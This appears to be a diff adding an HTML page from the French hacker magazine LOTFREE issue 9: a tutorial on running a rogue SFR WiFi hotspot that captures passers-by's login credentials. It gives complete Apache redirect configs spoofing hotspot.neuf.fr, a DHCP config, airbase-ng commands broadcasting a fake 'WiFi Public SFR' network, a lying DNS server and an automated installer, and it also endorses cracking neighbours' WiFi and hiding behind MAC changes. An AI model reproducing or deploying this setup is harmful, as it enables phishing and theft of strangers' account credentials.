@@ -1,0 +1,185 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link href="css/shCore.css" rel="stylesheet" type="text/css" />
+    <link href="css/shThemeDefault.css" rel="stylesheet" type="text/css" />
+  </head>
+  <body>
+    <div id="head">LOTFREE Magazine numéro 9</div>
+    <div id="foot"><span style="float: left;"><br />Lancez la radio, cliquez ici : </span><a href="#" onclick="window.open('player.html', 'Player', 'toolbar=0,status=0,location=0,menubar=0,resizable=0,width=175,height=35')"><img src="icon.png" /></a></div>
+    <div id="left">
+      <dl>
+        <dt><strong>Welcome to your inbox Hacker !</strong></dt>
+        <dd>Directories :</dd>
+        <dt><a id="inbox" class="nav" href="inbox.html"> Inbox</a></dt>
+        <dd>One for the money</dd>
+        <dt><a id="drafts" class="nav" href="drafts.html">Drafts</a></dt>
+        <dd>Two for the show</dd>
+        <dt><a id="sent" class="nav" href="sent.html">Sent</a></dt>
+        <dd>Three to get ready</dd>
+        <dt><a id="spam" class="nav" href="spam.html">Spam</a></dt>
+        <dd>And four to go</dd>
+        <dt><a id="trash" class="nav" href="trash.html">Trash</a></dt>
+        <dd>Enjoy ;-)</dd>
+      </dl>
+    </div>
+
+    <div id="content">
+      <p><strong>Faire un rogue hotspot SFR</strong></p>
+      <p>Casser le réseau WiFi de son voisin c'est bien... Quand on y arrive. Quite à se déplacer dans le quartier jusqu'à trouver un type qui tourne encore avec WEP (et dont la clé est 123456, vérifique :p)<br />
+      Mais ça devient plus ardu quand on a affaire à du WPA. Chopper le handshake n'est pas un problème, quitte à se placer avec son laptop devant la porte d'entrée d'inconnus :D, mais trouver la bonne clé ça devient hard vu que la plupart du temps c'est une clé par défaut impossible à casser :'(</p>
+
+      <p>Il y a alors une solution : profiter des HotSpots qui eux se multiplient de plus en plus. Seul point noir : pour utiliser un hotspot de chez untel, il faut avoir les identifiants d'un compte enregistré chez untel.<br />
+      Et c'est là qu'intervient notre rogue hotspot : Créer un réseau WiFi accessible à tous mais pour lequel toute tentative d'accès à Internet redirigera vers une page de connexion qui enregistrera les identifiants. Identifiants qui nous ouvrirons les portes des hotspots de chez untel à gogo :) Et puis question anonymat c'est le top. Il suffira de changer régulièrement son adresse MAC (pour les plus paranos) et de hotspot... vu que le seul vrai identifiant c'est les logins récupérés on est tranquille.</p>
+
+      <p>Par contre il faut que quelqu'un dans le coin ait déjà envie de se connecter via un hotspot et là il faut mieux être dans un endroit surpeuplé ou alors être très patient...</p>
+
+      <p><strong>Tour d'horizon de la mise en place</strong></p>
+
+      <p>Toutes les opérations sont destinées à un environnement BackTrack 5. Bien sûr ça peut être adapté pour votre distrib. Le script automatique final (install.bin) est lui uniquement dédié à BT5.<br />
+      Les fichiers correspondant à cet article sont situés dans <a href="../data/hotspot">data/hotspot</a></p>
+
+      <p>Je n'entre pas dans les détails de la mise en place de la page web qui demandera les identifiants. Il suffit de pomper les pages et les images d'un vrai hotspot et de les re-servir. Pour le coup, Opera est le plus adapté avec son option d'enregistrement &quot;Fichier HTML avec des images&quot;</p>
+
+      <p>Pour le reste voici de quoi on a besoin :</p>
+      <ul>
+        <li>Un serveur Apache qui renverra les pages. Il est intégré sur BT5</li>
+        <li>airbase-ng (de la suite airmon-ng) pour créer réseau WiFi. Il est sur BT5</li>
+        <li>Un serveur DHCP parce que les gens qui se connecteront au réseau doivent recevoir les paramêtres (routeur, DNS, IP...) N'est pas par défaut sur BT5</li>
+        <li>Un DNS menteur. Pas besoin d'un truc évolué, on veut juste un mini serveur DNS qui répondra à toutes les requêtes par l'adresse IP de notre serveur Apache</li>
+        <li>PHP pour pouvoir stocker les logins récupérés (c'est plus propre)</li>
+      </ul>
+
+      <p>Vous devez déjà voir vers quoi on arrive. La personne se connecte au WiFi, se voit donner une adresse IP. Quand elle tente d'accèder à un site web, le DNS lui renvoit notre IP sur le réseau (mettons 192.168.1.1).<br />
+      Mais c'est pas très propre car la page de login s'affichera dans le navigateur avec le nom DNS du site. On va donc configurer Apache pour qu'il redirige vers hotspot.neuf.fr qui sera pourtant le même serveur.<br />
+      Idem pour la page demandée : la victime aura peut-être son navigateur qui ira vers www.truc.com/forum/. Dans ce cas là il faut aussi faire en sorte que une demande d'une page non existante sur notre serveur (ici /forum) renvoit vers notre page de login.</p>
+
+      <p><strong>Configuration d'Apache</strong></p>
+
+      <p>Apache gère les sites qu'il gère via le dossier /etc/apache2/sites-available/. On va d'abord créer un fichier <em>default</em> qui redirigera toutes les requêtes correspondant à un nom DNS autre que le hotspot. Voici son contenu</p>
+
+      <pre class="brush: plain">&lt;VirtualHost *:80&gt;
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www
+        &lt;Directory /var/www/&gt;
+                Options Indexes FollowSymLinks MultiViews
+                AllowOverride None
+                Order allow,deny
+                allow from all
+        &lt;/Directory&gt;
+        ErrorLog /var/log/apache2/error.log
+        Redirect permanent / &quot;http://hotspot.neuf.fr/&quot;
+        LogLevel warn
+        CustomLog /var/log/apache2/access.log combined
+&lt;/VirtualHost&gt;</pre>
+
+     <p>On répète l'opération mais cette fois pour les requêtes HTTPS (fichier <em>default-ssl</em>). Par contre comme il n'y aura pas de relais Internet sur notre rogue hotspot, les CAs ne seront pas joignables et l'utilisateur aura un avertissement concernant le certifcat :( Voici les directives :</p>
+
+     <pre class="brush: plain">&lt;IfModule mod_ssl.c&gt;
+&lt;VirtualHost *:443&gt;
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www
+        &lt;Directory /var/www/&gt;
+                Options Indexes FollowSymLinks MultiViews
+                AllowOverride None
+                Order allow,deny
+                allow from all
+        &lt;/Directory&gt;
+        ErrorLog /var/log/apache2/error.log
+        Redirect permanent / &quot;http://hotspot.neuf.fr/&quot;
+        LogLevel warn
+        CustomLog /var/log/apache2/ssl_access.log combined
+        SSLEngine on
+        SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
+        SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
+        BrowserMatch &quot;MSIE [2-6]&quot; \
+                nokeepalive ssl-unclean-shutdown \
+                downgrade-1.0 force-response-1.0
+        BrowserMatch &quot;MSIE [17-9]&quot; ssl-unclean-shutdown
+&lt;/VirtualHost&gt;
+&lt;/IfModule&gt;</pre>
+
+      <p>Enfin il faut le fichier de conf de notre hotspot. On le nommera simplement <em>hotspot</em></p>
+
+      <pre class="brush: plain">&lt;VirtualHost *:80&gt;
+        ServerAdmin webmaster@localhost
+        ServerName hotspot.neuf.fr
+        DocumentRoot /var/www
+        &lt;Directory /var/www/&gt;
+                Options Indexes FollowSymLinks MultiViews
+                AllowOverride None
+                Order allow,deny
+                allow from all
+        &lt;/Directory&gt;
+        ErrorDocument 404 &quot;/404.php&quot;
+        ErrorLog /var/log/apache2/error.log
+        LogLevel warn
+        CustomLog /var/log/apache2/access.log combined
+&lt;/VirtualHost&gt;</pre>
+
+      <p>Comme vous le voyez, les pages et scripts web sont à placer dans /var/www.</p>
+
+      <p><strong>Mise en place de l'interface réseau</strong></p>
+
+      <p>On va commencer par installer le serveur DHCP. Pour cela il faut avoir au préalable récupéré le .deb. On a pris <em>dhcp3-server_3.1.3-2ubuntu3.2_i386.deb</em> qui est accessible <a href="http://packages.ubuntu.com/lucid-updates/i386/dhcp3-server/download">à cette adresse</a>. L'install se fera classiquement en root avec <em>dpkg -i dhcp3-server_3.1.3-2ubuntu3.2_i386.deb</em>.</p>
+
+      <p>Ensuite on définit les régles de notre réseau via <em>/etc/dhcp3/dhcpd.conf</em> (pour plus d'infos voir la page de manuelle ou Google) :</p>
+
+      <pre class="brush: plain">ddns-update-style ad-hoc;
+
+default-lease-time 600;
+max-lease-time 7200;
+
+authoritative;
+
+subnet 192.168.1.0 netmask 255.255.255.0 {
+  option subnet-mask 255.255.255.0;
+  option routers 192.168.1.1;
+  range 192.168.1.10 192.168.1.20;
+  option domain-name-servers 192.168.1.1;
+  option broadcast-address 192.168.1.255;
+}</pre>
+
+      <p>L'install de DHCP toute à l'heure fait démarrer le serveur... On l'arrête comme on a changé le fichier de conf : <em>/etc/init.d/dhcp3-server stop &amp; killall dhclient3</em></p>
+
+      <p>Etape suivante : Mettre en place l'interface WiFI ! Car pour le moment on n'a fait que changer des fichiers de conf.</p>
+
+      <pre class="brush: bash">echo &quot;[!] Mise en place du hotspot...&quot;
+airmon-ng start wlan0
+airbase-ng -e &quot;WiFi Public SFR&quot; -c 11 mon0&amp;
+sleep 5
+ifconfig at0 up
+ifconfig at0 192.168.1.1 netmask 255.255.255.0</pre>
+
+      <p>Ici on passe l'interface wlan0 en mode monitor puis on associe un SSID à la nouvelle interface mon0. Il faudrait placer le SSID le plus crédible possible... Toutefois depuis une machine Windows si plusieurs réseaux accessibles ont le même SSID, seul celui qui a le plus fort signal est affiché. Conclusion : soit vous avez une carte wifi surpuissante, soit vous trichez en spécifiant un SSID proche mais différent ;-) Dans tous les cas le tri se fait toujours par force de signal.</p>
+
+      <p>On peut maintenant relancer notre serveur DHCP : <em>dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /tmp/plop.pid at0</em></p>
+
+      <p><strong>Mise en place d'Apache : finalisation et lancement</strong></p>
+
+      <p>Il faut activer les sites dans le config globale d'Apache ainsi que les modules dont on a besoin :</p>
+
+      <pre class="brush: bash">echo &quot;192.168.1.1 hotspot.neuf.fr&quot; &gt;&gt; /etc/hosts
+a2enmod ssl
+a2ensite default-ssl
+a2ensite hotspot
+/etc/init.d/apache2 start</pre>
+
+      <p><strong>Mise en place du serveur DNS</strong></p>
+
+      <p>Après quelques tests, notre préférence est allée au script <em>fakedns.pl</em> de <a href="http://www.0x90.co.uk/2011/06/dynamic-analysis-of-malware-using-fake.html">0x90.co.uk</a> (blog sympa). Script à éditer selon nos attentes puis à exécuter : <em>chmod +x fakedns.pl; ./fakedns.pl&amp;</em></p>
+
+      <p>Maintenant tout est en place... plus qu'à attendre que la victime morde à l'hameçon :) Nous fournissons un script <a href="../data/hotspot/install.bin">install.bin</a> qui fait toutes les opérations sur BT5.</p>
+    </div>
+<script language="javascript" src="js/shCore.js"></script>
+<script language="javascript" src="js/shBrushBash.js"></script>
+<script language="javascript" src="js/shBrushPlain.js"></script>
+<script type="text/javascript">
+  SyntaxHighlighter.all()
+</script>
+  </body>
+</html>
